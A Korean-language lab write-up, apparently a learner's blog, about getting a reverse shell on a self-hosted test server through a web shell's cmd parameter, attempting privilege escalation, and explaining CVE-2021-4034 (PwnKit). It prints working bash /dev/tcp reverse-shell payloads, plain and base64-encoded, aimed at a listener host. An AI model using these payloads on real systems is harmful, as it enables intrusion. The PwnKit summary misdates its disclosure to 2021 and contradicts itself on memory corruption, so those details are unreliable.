## 리버스쉘 연결

칼리에서 4444번 포트를 열어두고(nc -lvnp 4444),<br>
버프 리피터에서 `bash -i >& /dev/tcp/192.168.45.171/4444 0>&1` 명령어를 아래 요청과 같이 보냈는데...<br><br>

```
/logintest/file/test.php?cmd=bash+-i+>%26+/dev/tcp/192.168.45.171/4444+0>%261
```


처음에 안 잡혔다. 네트워크 문제인가? 했지만 게시판이 있는 우분투 서버에서 직접 `bash -i >& /dev/tcp/칼리주소/4444 0>&1` 을 입력하면 연결 잘 되는 것을 확인, 네트워크 문제는 아니었다.<br><br>

그냥 인코딩 문제였다. URL과 셸 양쪽에서 특수문자가 충돌하는 게 원인이어서 base64로 인코딩해서 보내니 간단하게 해결됨.<br><br>

```
/logintest/file/test.php?cmd=echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE3MS80NDQ0IDA%2BJjE=|base64+-d|bash
```

앞으로 무조건 base64로 인코딩해서 보내야징.<br><br>

아무튼 칼리로 리버스쉘 연결 성공! 현재 계정은 uid, gid 모두 33인 www-data. 최종 목표는 root까지 권한 상승인데...<br><br>

## 권한 상승 시도

<br>
결론부터 말하면 아직 성공 못 함.<br><br>

### 시도 1. 쓰기 권한이 있는 중요 파일 찾기
/etc/passwd 같은 파일이 writable이면 uid=0 계정 만들고 끝인데, 당연히 그렇게 허술한 파일은 없었음.<br><br>

### 시도 2. SUID 파일 이용하기
SUID 붙은 파일들은 거의 다 기본 시스템 파일로 건드릴 수가 없었음. "이게 왜 SUID지?" 싶은 파일이 있으면 GTFOBins에서 찾아 그대로 적용하면 된다는데, 그런 파일은 없었다네요...<br><br>

그런데 `/usr/bin/pkexec`에 SUID 비트가 붙어있었음. CVE-2021-4034(PwnKit)이라는 polkit pkexec 바이너리의 메모리 취약점을 써먹을 수 있을까 싶었는데, 패치 안 된 버전이어야 바로 root까지 가는 익스플로잇이 통한다고 함. 버전만 봐서는 이게 패치가 된 상태인건지??? 숫자가 한 끗 차이로 애매해서 일단 공개된 방법으로 익스플로잇 시도했는데, 역시나 이미 패치되어 있었음. 하긴 5년 전 취약점인데..ㅜ 자동 보안 업데이트 됐겠지...<br><br>

일단 CVE-2021-4034가 어떤 취약점인지만 정리해두고 다른 방법은 차차 생각해보기로 함.<br><br>

#### CVE-2021-4034 (PwnKit) 정리

- pkexec는 SUID root 바이너리라 실행되는 순간 root 권한으로 동작함. 정상적으론 polkit 정책을 확인해서 권한 있는 사용자만 명령을 실행하게 해주는 도구.
- 취약점은 인자(argument) 처리 버그. C 프로그램은 실행 시 argc(인자 개수)와 argv(인자 배열)를 받는데, argv[0]에 프로그램 이름이 들어가므로 정상적으론 argc가 최소 1이어야 함. pkexec는 argc=0인 경우를 처리하지 않았음.
- 공격자가 execve()로 argc=0을 강제 호출하면, pkexec 내부 코드가 배열 범위를 벗어나 환경변수 영역을 argv로 잘못 읽음. 이때 환경변수를 교묘하게 세팅해두면 pkexec가 root 권한으로 공격자가 심어둔 코드를 실행 → root 쉘 획득.
- 비유하면, 줄을 서는데 "0번 손님"이라는 존재하지 않는 번호를 부르니 시스템이 혼란스러워져서 옆에 있던 아무나(공격자가 심어둔 것)를 VIP로 들여보내는 셈.
- 메모리 손상이 아닌 로직 버그라서 익스플로잇이 안정적이고 거의 모든 배포판에 통했음. 2021년 1월에 공개되며 크게 이슈가 됐던 취약점.
